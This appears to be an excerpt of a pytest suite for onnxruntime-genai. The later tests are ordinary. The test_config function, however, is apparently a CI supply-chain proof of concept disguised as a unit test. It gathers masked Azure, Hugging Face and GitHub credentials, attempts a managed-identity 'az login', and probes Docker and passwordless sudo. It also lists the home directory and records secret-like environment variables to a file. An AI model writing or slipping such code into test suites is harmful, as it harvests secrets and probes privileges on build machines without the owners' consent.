...
def test_config(test_data_path):
    ...
    try:
        ...
        with open(output_file, "w") as f:
            ...
            f.write(f"POC: microsoft/onnxruntime-genai\n\n")
            ...
            f.write(f"Workspace: {mask_value(os.environ.get('GITHUB_WORKSPACE', ''))}\n\n")

            # Azure Credentials (masked)
            f.write("=== Azure Credentials (Masked) ===\n")
            for key in ['AZCOPY_MSI_CLIENT_ID', 'AZCOPY_AUTO_LOGIN_TYPE', 'AZCOPY_MSI_OBJECT_ID',
                       'AZCOPY_MSI_RESOURCE_ID', 'AZURE_SUBSCRIPTION_ID', 'AZURE_TENANT_ID']:
                val = os.environ.get(key, '')
                if val:
                    f.write(f"{key}: {mask_value(val)}\n")

            # Other credentials
            f.write("\n=== Other Credentials (Masked) ===\n")
            for key in ['HF_TOKEN', 'GITHUB_TOKEN', 'ORT_NIGHTLY_REST_API']:
                val = os.environ.get(key, '')
                if val:
                    f.write(f"{key}: {mask_value(val)}\n")
            ...
            f.write("\n=== Azure CLI ===\n")
            az_check = run_cmd(['which', 'az'])
            if 'az' in az_check:
                f.write("Azure CLI: installed\n")

                # Try MSI login
                az_identity = run_cmd(['az', 'login', '--identity'], timeout=15)
                if 'error' not in az_identity.lower():
                    f.write("MSI Login: SUCCESS\n")

                    # Get account info
                    az_account = run_cmd(['az', 'account', 'show'])
                    try:
                        account_data = json.loads(az_account)
                        f.write(f"Subscription ID: {mask_value(account_data.get('id', ''))}\n")
                        f.write(f"Subscription Name: {mask_value(account_data.get('name', ''))}\n")
                        f.write(f"Tenant ID: {mask_value(account_data.get('tenantId', ''))}\n")
                        f.write(f"User: {mask_value(account_data.get('user', {}).get('name', ''))}\n")
                    except:
                        f.write(az_account[:200] + "...\n")
                else:
                    f.write("MSI Login: failed\n")
            else:
                f.write("Azure CLI: not installed\n")

            # GPU info
            f.write("\n=== GPU ===\n")
            gpu_check = run_cmd(['which', 'nvidia-smi'])
            if 'nvidia-smi' in gpu_check:
                gpu_full = run_cmd(['nvidia-smi'])
                f.write(gpu_full[:500] + "...\n")
            else:
                f.write("nvidia-smi: not available\n")

            # Docker access
            f.write("\n=== Docker ===\n")
            docker_check = run_cmd(['which', 'docker'])
            if 'docker' in docker_check:
                f.write("Docker: installed\n")
                docker_info = run_cmd(['docker', 'info'], timeout=10)
                if 'error' not in docker_info.lower() and 'permission denied' not in docker_info.lower():
                    f.write("Docker socket: accessible\n")
                    f.write(docker_info[:300] + "...\n")
                else:
                    f.write("Docker socket: no access\n")
            else:
                f.write("Docker: not installed\n")

            # Sudo check
            f.write("\n=== Privileges ===\n")
            sudo_check = run_cmd(['sudo', '-n', 'true'], timeout=2)
            f.write(f"Passwordless sudo: {'YES' if sudo_check == '' else 'NO'}\n")
            f.write(f"User: {os.environ.get('USER', 'unknown')}\n")
            f.write(f"UID: {os.getuid()}\n")

            # File system
            f.write("\n=== Filesystem ===\n")
            home_ls = run_cmd(['ls', '-la', os.path.expanduser('~')])
            f.write(f"Home directory:\n{home_ls[:400]}\n")

            # Environment (all masked)
            f.write("\n=== Environment Variables (All Masked) ===\n")
            for k in sorted(os.environ.keys()):
                v = os.environ[k]
                if any(s in k.upper() for s in ['TOKEN', 'KEY', 'SECRET', 'PASS', 'CRED', 'MSI', 'ID', 'AZURE']):
                    f.write(f"{k}: {mask_value(v)}\n")
                elif len(v) > 50:
                    f.write(f"{k}: {mask_value(v)}\n")
            ...
            f.write(f"Hostname: {mask_value(hostname.strip())}\n")
...
def test_log_filename(test_data_path):
    ...
    with tempfile.NamedTemporaryFile(mode="w+", suffix=".txt", delete=False) as log_file:
        ...
        assert not callback_invoked, (
            "Log callback was invoked. It should not have been since it was overridden by the log file."
        )
...
@pytest.mark.skipif(not og.is_cuda_available(), reason="Pipeline model uses a mix of CPU and CUDA EP.")
...
def test_pipeline_model(test_data_path, phi2_for, relative_model_path):
    ...
    for i in range(len(prompts)):
        ...
        if not equal:
            ...
            print(f"expected = {expected_output[i]!r}", flush=True)
            print(f"actual = {actual_output!r}", flush=True)
        assert equal
...
def test_adapters(test_data_path, device, multiple_adapters, phi2_for):
    def _prepare_adapter_model(test_data_path):
        ...
        adapters = {
            "adapter_a": onnxruntime.OrtValue.ortvalue_from_numpy_with_onnx_type(a, onnx_dtype),
            "adapter_b": onnxruntime.OrtValue.ortvalue_from_numpy_with_onnx_type(b, onnx_dtype),
        }
...
def test_audio_preprocessing_multiple_audios(test_data_path, relative_model_path, relative_audio_paths):
    ...
    audio_paths = [
        os.fspath(Path(test_data_path) / relative_audio_path) for relative_audio_path in relative_audio_paths
    ]
    audios = og.Audios.open(*audio_paths)
